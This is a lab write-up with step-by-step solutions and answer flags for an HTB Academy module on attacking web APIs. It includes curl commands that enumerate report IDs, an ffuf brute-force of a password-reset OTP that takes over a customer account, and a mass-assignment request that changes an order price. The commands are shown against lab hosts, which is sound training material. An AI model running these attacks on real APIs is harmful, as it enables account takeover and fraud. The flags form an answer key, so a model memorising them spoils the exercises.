
| Section | Question Number | Answer |
| --- | --- | --- |
| Introduction to Lab | Question 1 | Kestrel |
| Introduction to Lab | Question 2 | /api/v1/roles/current-user |
| Broken Object Level Authorization | Question 1 | HTB{e76651e1f516eb5d7260621c26754776} |
| Broken Authentication | Question 1 | HTB{115a6329120e9eff13c4ec6a63343ed1} |
| Broken Object Property Level Authorization | Question 1 | HTB{d759c70b5a9f6a392af78cc1eca9cdf0} |
| Broken Object Property Level Authorization | Question 2 | HTB{4d86794f82046e465ca29d91bdbe5bca} |
| Unrestricted Resource Consumption | Question 1 | HTB{01de742d8cd942ad682aeea9ce3c5428} |
| Broken Function Level Authorization | Question 1 | HTB{1e2095c564baf0d2d316080217040dae} |
| Unrestricted Access to Sensitive Business Flows | Question 1 | 788 Sauchiehall St. |
| Server Side Request Forgery | Question 1 | HTB{3c94232c4f0b0a544ae4024833eef0b3} |
| Security Misconfiguration | Question 1 | 151 |
| Security Misconfiguration | Question 2 | access-control-allow-origin: \* |
| Improper Inventory Management | Question 1 | HTB{43c2754afea99eba70fb2c8dc443c660} |
| Unsafe Consumption of APIs | Question 1 | 006006C3167E90A7575A12E474218D86 |
| Skills Assessment | Question 1 | HTB{f190b80cd543a84b236e92a07a9d8d59} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Introduction to Lab

## Question 1

### "Interact with any endpoint and inspect the response headers; what is the name of the server that the web API uses?"

Students need to use `Firefox` and browse to the `Swagger` user interface at `http://STMIP:STMPO/swagger/index.html`. Then, students need to select an endpoint to interact with, using the drop down arrows seen on the right hand side of the page. In the example seen below, we will view the API endpoints associated with **Authentication**:

![[HTB Solutions/Others/z. images/3745909fd197d09d897af2d91db78c10_MD5.jpg]]

![[HTB Solutions/Others/z. images/a21a917d630043fc83f7d7540f41947c_MD5.jpg]]

From here, students can choose a specific endpoint to interact with, once again by using the drop down arrow(s) on the right hand side of the page. Once an endpoint has been selected (such as `/api/v1/authentication/customers/passwords/resets`), students need to invoke it by pressing the blue `Execute` button:

![[HTB Solutions/Others/z. images/cbda61d9810154a3b2ce408e03a71bdd_MD5.jpg]]

After executing the request, students need to scroll down and look at the response headers:

![[HTB Solutions/Others/z. images/9d9d08397e8ac614bef8db99834a511b_MD5.jpg]]

Answer: `Kestrel`

# Introduction to Lab

## Question 2

### "There is only one endpoint belonging to the Roles group. Submit its path."

Students need to examine the single API endpoint found under the `Roles` group:

![[HTB Solutions/Others/z. images/dfef1e339f877a6825d046e9ebee5a02_MD5.jpg]]

Answer: `/api/v1/roles/current-user`

# Broken Object Level Authorization

## Question 1

### "Exploit another Broken Object Level Authorization vulnerability and submit the flag."

To begin, students need to navigate to the `/api/v1/authentication/suppliers/sign-in` endpoint, signing in as `htbpentester2@pentestercompany.com:HTBPentester2` and obtaining a JSON Web Token:

![[HTB Solutions/Others/z. images/a50fcf7461ea51d2bbb6a3f889372a8e_MD5.jpg]]

![[HTB Solutions/Others/z. images/4bf827a60d5c19d6321c9e5f216081eb_MD5.jpg]]

Now, students need to click the `Authorize` button seen on the Swagger dashboard, entering the value of the generated JWT when prompted:

![[HTB Solutions/Others/z. images/4da27fe4f8a998032409196b6c8c31fc_MD5.jpg]]

![[HTB Solutions/Others/z. images/7591b7162aa2a3a74de44b5888a39061_MD5.jpg]]

This ensures that the JWT will automatically be included in all subsequent API endpoint requests.

From here, students need to check the `/api/v1/roles/current-user` endpoint:

![[HTB Solutions/Others/z. images/e01e9f85381b51742617c518e4c1b6d2_MD5.jpg]]

Identifying the role `Suppliers_GetQuarterlyReportByID`, students need to focus on the GET `/api/v1/suppliers/quarterly-reports/{ID}` endpoint, utilizing a Bash `for-loop` to quickly view the available reports:

```
for ((i=1; i<= 20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://STMIP:STMPO/api/v1/suppliers/quarterly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJI<SNIP>v2Am8i7I9bL3A' | jq
  done
```

Finally, students need to run the script, having the output piped into `grep` to identify the flag (which typically starts with the letters `HTB`):

```
┌─[htb-ac-594497@htb-xha29nskcc]─[~]
└──╼ $for ((i=1; i<= 20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://94.237.53.113:45933/api/v1/suppliers/quarterly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTcyMDQ3NTM1NiwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.OCPG5mm_PRw_udloW8hSifiqM9LjhI1qI7knsHaRUMD5SyAvywSsi_wrqExbyRL4igUrZEfqjv2Am8i7I9bL3A' | jq
  done | grep HTB
  
    "commentsFromManager": "HTB{hidden}"
```

Answer: `HTB{e76651e1f516eb5d7260621c26754776}`

# Broken Authentication

## Question 1

### "Exploit another Broken Authentication vulnerability to gain unauthorized access to the customer with the email '"

Students need to first authenticate as `htbpentester3@hackthebox.com:HTBPentester3`, obtaining a JWT to then subsequently explore the `/api/v1/customers` endpoint, searching for `Mason Jenkins`:

![[HTB Solutions/Others/z. images/d75cdd769ddf9b2d3e5728b9c80f8c11_MD5.jpg]]

Students may also utilize `curl` to interact with the endpoint , and view the information of the desired customer:

Code: shell

```shell
curl -s -X 'GET' 'http://STMIP:STMPO/api/v1/customers' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT>' | \
  jq '.customers[] | select(.name == "Mason Jenkins")'
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-o8qc61mzlr]─[~]
└──╼ [★]$ curl -s -X 'GET' 'http://83.136.255.222:56020/api/v1/customers' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjNAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJzX1VwZGF0ZUJ5Q3VycmVudFVzZXIiLCJDdXN0b21lcnNfR2V0IiwiQ3VzdG9tZXJzX0dldEFsbCJdLCJleHAiOjE3MjEwNTc1NjgsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.DHpNdlOX3p6weP9uMqrbT8lnfgGcoaTof8yOPQHGx4ZYDXuCRlXREuQZenLmoeFj1eByfSPShKIybkbTEaFcPg' | \
  jq '.customers[] | select(.name == "Mason Jenkins")'
  
{
  "id": "53428a83-8591-4548-a553-c434ad76a61a",
  "name": "Mason Jenkins",
  "email": "MasonJenkins@ymail.com",
  "phoneNumber": "+44 7451 162707",
  "birthDate": "1985-09-16"
}
```

After obtaining `Mason Jenkins` information, students need to visit the `/api/v1/authentication/customers/passwords/resets/email-otps` endpoint, using it to send an OTP to `MasonJenkins@ymail.com`:

![[HTB Solutions/Others/z. images/e8cdd680b8c1ee7df54114bc4027d797_MD5.jpg]]

![[HTB Solutions/Others/z. images/f4e6e50d4c4771eb7d440a305aa2bc3e_MD5.jpg]]

Having confirmed that the OTP was sent, students now need to inspect the `/api/v1/authentication/customers/passwords/resets` endpoint:

![[HTB Solutions/Others/z. images/45404b9697608f416cab0718a888396a_MD5.jpg]]

Students will find that if they are able to provide a user's email along with the OTP , it will allow them to set a new password for the account. Subsequently, students need to fill out dummy information and execute a password reset, so they may analyze the response:

Code: shell

```shell
curl -X 'POST' \
  'http://STMIP:STMPO/api/v1/authentication/customers/passwords/resets' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "MasonJenkins@ymail.com",
  "OTP": "test",
  "NewPassword": "test"
}'
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-o8qc61mzlr]─[~]
└──╼ [★]$ curl -X 'POST' \
  'http://83.136.255.222:56020/api/v1/authentication/customers/passwords/resets' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "MasonJenkins@ymail.com",
  "OTP": "test",
  "NewPassword": "test"
}'

{"SuccessStatus":false}
```

When the password reset fails, the API replies with `{"SuccessStatus":false}`. Therefore, students need to use `ffuf` to bruteforce the OTP for the `Mason Jenkins` user. Students should also note that an OTP is valid for only five minutes; so it may be necessary to request a new OTP depending on how much time has gone by.

Students may begin their fuzzing of the OTP with a wordlist of four-digit passwords:

Code: shell

```shell
ffuf -w /opt/useful/seclists/Fuzzing/4-digits-0000-9999.txt:FUZZ -u http://STMIP:STMPO/api/v1/authentication/customers/passwords/resets -X POST -H "Content-Type: application/json" -H "accept: application/json" -d '{"Email":"MasonJenkins@ymail.com", "OTP": "FUZZ", "NewPassword": "123456"}' -fr '{"SuccessStatus":false}'
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-o8qc61mzlr]─[~]
└──╼ [★]$ ffuf -w /opt/useful/seclists/Fuzzing/4-digits-0000-9999.txt:FUZZ -u http://94.237.53.157:37073/api/v1/authentication/customers/passwords/resets -X POST -H "Content-Type: application/json" -H "accept: application/json" -d '{"Email":"MasonJenkins@ymail.com", "OTP": "FUZZ", "NewPassword": "123456"}' -fr '{"SuccessStatus":false}'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.53.157:37073/api/v1/authentication/customers/passwords/resets
 :: Wordlist         : FUZZ: /opt/useful/seclists/Fuzzing/4-digits-0000-9999.txt
 :: Header           : Content-Type: application/json
 :: Header           : Accept: application/json
 :: Data             : {"Email":"MasonJenkins@ymail.com", "OTP": "FUZZ", "NewPassword": "123456"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: {"SuccessStatus":false}
________________________________________________

2421                    [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 158ms]
```

Having successfully fuzzed the OTP, the password will have been reset as well (in the example shown above, we have set the password to `123456`.)

Using the new password, students need to authenticate and get a JWT.

Code: shell

```shell
curl -X 'POST' \
  'http://STMIP:STMPO/api/v1/authentication/customers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "MasonJenkins@ymail.com",
  "Password": "123456"
}'
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-o8qc61mzlr]─[~]
└──╼ [★]$ curl -X 'POST' \
  'http://94.237.53.157:37073/api/v1/authentication/customers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "MasonJenkins@ymail.com",
  "Password": "123456"
}'

{"jwt":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Ik1hc29uSmVua2luc0B5bWFpbC5jb20iLCJleHAiOjE3MjEwNjMwODYsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.TEgv_JOEMylYAx6-xh1oKkdgTf4VgxsP1ERjNx7FOhlcSiAh4HYhLkzVVS6f22aylFpWztJ9Y8fxOB9gSy0qQw"}
```

![[HTB Solutions/Others/z. images/dbc2c9c4686e6567207f47b43aa37ce0_MD5.jpg]]

Finally, students need to use the `/api/v1/customers/payment-options/current-user` endpoint, retrieving the payment options of the Mason Jenkins user as well as the flag:

Code: shell

```shell
curl -s -X 'GET'   'http://STMIP:STMPO/api/v1/customers/payment-options/current-user'   -H 'accept: application/json'   -H 'Authorization: Bearer <JWT>'| jq .
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-o8qc61mzlr]─[~]
└──╼ [★]$ curl -s -X 'GET'   'http://94.237.53.157:37073/api/v1/customers/payment-options/current-user'   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Ik1hc29uSmVua2luc0B5bWFpbC5jb20iLCJleHAiOjE3MjEwNjMwODYsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.TEgv_JOEMylYAx6-xh1oKkdgTf4VgxsP1ERjNx7FOhlcSiAh4HYhLkzVVS6f22aylFpWztJ9Y8fxOB9gSy0qQw'| jq . 

{
  "customerPaymentOptions": [
    {
      "customerID": "53428a83-8591-4548-a553-c434ad76a61a",
      "type": "Debit Card",
      "provider": "Capital One",
      "accountNumber": "9754729874181436",
      "cvvHash": "B6EDC1CD1F36E45DAF6D7824D7BB2283"
    },
    {
      "customerID": "53428a83-8591-4548-a553-c434ad76a61a",
      "type": "Credit Card",
      "provider": "HTB Academy",
      "accountNumber": "HTB{hidden}",
      "cvvHash": "5EF0B4EBA35AB2D6180B0BCA7E46B6F9"
    }
  ]
}
```

Answer: `HTB{115a6329120e9eff13c4ec6a63343ed1}`

# Broken Object Property Level Authorization

## Question 1

### "Exploit another Excessive Data Exposure vulnerability and submit the flag."

To begin, students need to acquire a JWT using the credentials `htbpentester5@hackthebox.com:HTBPentester5`:

Code: shell

```shell
curl -X 'POST' \
  'http://STMIP:STMPO/api/v1/authentication/customers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "htbpentester5@hackthebox.com",
  "Password": "HTBPentester5"
}'
```

```
┌─[htb-ac-594497@htb-k12kdh1qwz]─[~]
└──╼ $curl -X 'POST' \
  'http://83.136.252.57:56248/api/v1/authentication/customers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "htbpentester5@hackthebox.com",
  "Password": "HTBPentester5"
}'

{"jwt":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjVAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJzX0dldCIsIlN1cHBsaWVyc19HZXRBbGwiLCJTdXBwbGllckNvbXBhbmllc19HZXQiLCJTdXBwbGllckNvbXBhbmllc19HZXRBbGwiXSwiZXhwIjoxNzIwNTczNTkyLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.vHffw3z8aYOyTEeYxLb9WxZOKrqszrGJd7JDw2O3Ec9k8615SzC-Ix_Km0hBW__5-hcAmW8GpB-b43kAJWPi3A"}
```

With the JWT being successfully returned by the API, students need to use the `Authorize` button (seen on the dashboard of the Swagger UI) to enter the value of the newly generated JWT:

![[HTB Solutions/Others/z. images/4da27fe4f8a998032409196b6c8c31fc_MD5.jpg]]

![[HTB Solutions/Others/z. images/7591b7162aa2a3a74de44b5888a39061_MD5.jpg]]

Now being able to make authorized API requests , students need to invoke the `/api/v1/supplier-companies` endpoint. Here, they will notice that the endpoint exposes sensitive fields of supplier companies (fields such as supplier email address, which typically would not be available to a regular customer.)

After closely inspecting all of the data returned by the endpoint, students will find the flag exposed via the `email` field of the `HTB Academy` supplier company:

Code: shell

```shell
curl -s -X 'GET' \
  'http://STMIP:STMPO/api/v1/supplier-companies' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT>' | \
  jq '.supplierCompanies[] | select(.name == "HTB Academy")'
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-ua0yuievmg]─[~]
└──╼ [★]$ curl -s -X 'GET'   'http://94.237.59.199:46589/api/v1/supplier-companies'   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjVAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJzX0dldCIsIlN1cHBsaWVyc19HZXRBbGwiLCJTdXBwbGllckNvbXBhbmllc19HZXQiLCJTdXBwbGllckNvbXBhbmllc19HZXRBbGwiXSwiZXhwIjoxNzIxMDcwMzQ0LCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.HiRjEm4bbhwOEPzsXMemZYtAh6Y0i0IWIKg4WOab3GKbri-bCNLQnd6li8_Xep4gg8FVWKASXfh9nXhDDPqhlg' | jq '.supplierCompanies[] | select(.name == "HTB Academy")'

{
  "id": "ccb287ef-83a6-423b-942a-089f87fa144c",
  "name": "HTB Academy",
  "email": "HTB{hidden}",
  "isExemptedFromMarketplaceFee": 0,
  "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
}
```

Answer: `HTB{d759c70b5a9f6a392af78cc1eca9cdf0}`

# Broken Object Property Level Authorization

## Question 2

### "Exploit another Mass Assignment vulnerability and submit the flag."

To begin, students need to obtain a JWT for the `htbpentester7@hackthebox.com` user, then apply the JWT via the `authorize` button seen on the Swagger UI:

Code: shell

```shell
curl -X 'POST' \
  'http://STMIP:STMPO/api/v1/authentication/customers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "htbpentester7@hackthebox.com",
  "Password": "HTBPentester7"
}'
```

```
┌─[htb-ac-594497@htb-k12kdh1qwz]─[~]
└──╼ $curl -X 'POST' \
  'http://83.136.252.57:56248/api/v1/authentication/customers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "htbpentester7@hackthebox.com",
  "Password": "HTBPentester7"
}'

{"jwt":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjdAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJPcmRlcnNfR2V0QnlJRCIsIkN1c3RvbWVyT3JkZXJzX0NyZWF0ZSIsIkN1c3RvbWVyT3JkZXJJdGVtc19HZXQiLCJDdXN0b21lck9yZGVySXRlbXNfQ3JlYXRlIl0sImV4cCI6MTcyMDU3NDE2NCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.ZqfcdYYVloQpIeeSRZiXQ9Ehhb10QsV1eIi6otw4fGnac-i8iZEhuV5ll1k2mF_AHCq-sTnNPaLqTlFVcFLXzA"}
```

![[HTB Solutions/Others/z. images/4da27fe4f8a998032409196b6c8c31fc_MD5.jpg]] ![[HTB Solutions/Others/z. images/7591b7162aa2a3a74de44b5888a39061_MD5.jpg]]

After applying the JWT, students need to view their available Roles, via the `/api/v1/roles/current-user` endpoint:

![[HTB Solutions/Others/z. images/52d46281120f21c6618b7481cf534198_MD5.jpg]]

Code: shell

```shell
curl -s -X 'GET' \
  'http://STMIP:STMPO/api/v1/roles/current-user' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT>' | jq .
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-ua0yuievmg]─[~]
└──╼ [★]$ curl -s -X 'GET'   'http://94.237.59.199:46589/api/v1/roles/current-user'   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjdAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJPcmRlcnNfR2V0QnlJRCIsIkN1c3RvbWVyT3JkZXJzX0NyZWF0ZSIsIkN1c3RvbWVyT3JkZXJJdGVtc19HZXQiLCJDdXN0b21lck9yZGVySXRlbXNfQ3JlYXRlIl0sImV4cCI6MTcyMTA3MTcwNCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.hDrByhv-_aDQKlZJ1CkTda5jy9fifXK2J-ntFoOsAjthn9O7IhBJIAJtuU10zyeBq1fzrer1SCsvtDs9iBIaIQ' | jq .

{
  "roles": [
    "CustomerOrders_GetByID",
    "CustomerOrders_Create",
    "CustomerOrderItems_Get",
    "CustomerOrderItems_Create"
  ]
}
```

Students will find four roles available; of particular interest are `CustomerOrders_Create` and `CustomerOrderItems_Create`.

Now, students need to create a new order using the POST endpoint `/api/v1/customers/orders`, taking note of the Order ID shown in the server response:

![[HTB Solutions/Others/z. images/73b5235b79639c15a2e69635f43a357c_MD5.jpg]]

![[HTB Solutions/Others/z. images/1ad5a748d2dcaddfdabf5cad07912c6a_MD5.jpg]]

```
{
  "id": "e022c3f7-5cab-4db8-822f-d1daa210e2f9"
}
```

Next, students need to invoke the `/api/v1/products` endpoint, which displays a list of all products along with their prices:

![[HTB Solutions/Others/z. images/bbe52520aa3518836d81a221ddc57e9c_MD5.jpg]]

Students need to take the ID of any product and note its original price (in this example, we will choose the `Smart Home Hub` product with the price of `25.5`):

```
{
      "id": "a923b706-0aaa-49b2-ad8d-21c97ff6fac7",
      "supplierID": "00ac3d74-6c7d-4ef0-bf15-00851bf353ba",
      "name": "Smart Home Hub",
      "price": 25.5,
      "pngPhotoFileURI": "NotProvidedYet"
    }
```

Now, students need to visit the POST `/api/v1/customers/orders/items` endpoint and read the description:

![[HTB Solutions/Others/z. images/c0b4772abd93b63d5a39ffa566a4840a_MD5.jpg]]

Students now need to utilize this endpoint to manipulate the customer order. More specifically, students need to supply the Order ID as well as the ID of the chosen item, setting the quantity to 1 while simultaneously setting `NetSum` to anything other than the original price of the product:

![[HTB Solutions/Others/z. images/32b6e4cbc68a6b267dc9e00844ccbd76_MD5.jpg]]

After invoking the endpoint, the flag will be revealed.

Code: shell

```shell
curl -X 'POST' \
  'http://STMIP:STMPO/api/v1/customers/orders/items' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT>' \
  -H 'Content-Type: application/json' \
  -d '{
  "OrderID": "<OrderID>",
  "OrderItems": [
    {
      "ProductID": "a923b706-0aaa-49b2-ad8d-21c97ff6fac7",
      "Quantity": 1,
      "NetSum": 1        
    }
  ]
}'
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-ua0yuievmg]─[~]
└──╼ [★]$ curl -X 'POST' \
  'http://94.237.59.199:46589/api/v1/customers/orders/items' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjdAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJPcmRlcnNfR2V0QnlJRCIsIkN1c3RvbWVyT3JkZXJzX0NyZWF0ZSIsIkN1c3RvbWVyT3JkZXJJdGVtc19HZXQiLCJDdXN0b21lck9yZGVySXRlbXNfQ3JlYXRlIl0sImV4cCI6MTcyMTA3MzQ1MSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.2YQ1U37MBf9xyyCPDYvBzWjftaZi6ZW7ajmSb4Ie0xXawrk2bWyUaA5mceVSBSrlZZea6JeAualt8d6XGCP72g' \
  -H 'Content-Type: application/json' \
  -d '{
  "OrderID": "e022c3f7-5cab-4db8-822f-d1daa210e2f9",
  "OrderItems": [
    {
      "ProductID": "a923b706-0aaa-49b2-ad8d-21c97ff6fac7",
      "Quantity": 1,
      "NetSum": 1
    }
  ]
}'

{"SuccessStatus":true,"Message":"HTB{hidden}"}
```

Answer: `HTB{4d86794f82046e465ca29d91bdbe5bca}`

# Unrestricted Resource Consumption

## Question 1

### "Exploit another Unrestricted Resource Consumption vulnerability and submit the flag."

Students need use Firefox and browse to `http://STMIP:STMPO/swagger/index.html`, then subsequently inspect the `/api/v1/authentication/customers/passwords/resets/sms-otps` endpoint and read the description:

![[HTB Solutions/Others/z. images/9caaf20c64e0486338bd83f79af6240f_MD5.jpg]]

Using the `Execute` button to invoke the SMS OTP endpoint, students will find that it lacks rate-limiting. Therefore, students need to invoke the endpoint multiple times in succession. After roughly ten executions within one minute, the flag will be returned:

![[HTB Solutions/Others/z. images/fa87cf93e41eae5214b937438c8ef3da_MD5.jpg]]

Answer: `HTB{01de742d8cd942ad682aeea9ce3c5428}`

# Broken Function Level Authorization

## Question 1

### "Exploit another Broken Function Level Authorization vulnerability and submit the flag."

To begin, students need to obtain a JWT for the `htbpentester9@hackthebox.com` user, then apply the JWT via the `Authorize` button seen on the dashboard of Swagger UI:

Code: shell

```shell
curl -X 'POST' \
  'http://STMIP:STMPO/api/v1/authentication/customers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "htbpentester9@hackthebox.com",
  "Password": "HTBPentester9"
}'
```

```
┌─[htb-ac-594497@htb-k12kdh1qwz]─[~]
└──╼ $curl -X 'POST' \
  'http://83.136.252.57:56248/api/v1/authentication/customers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "htbpentester9@hackthebox.com",
  "Password": "HTBPentester9"
}'

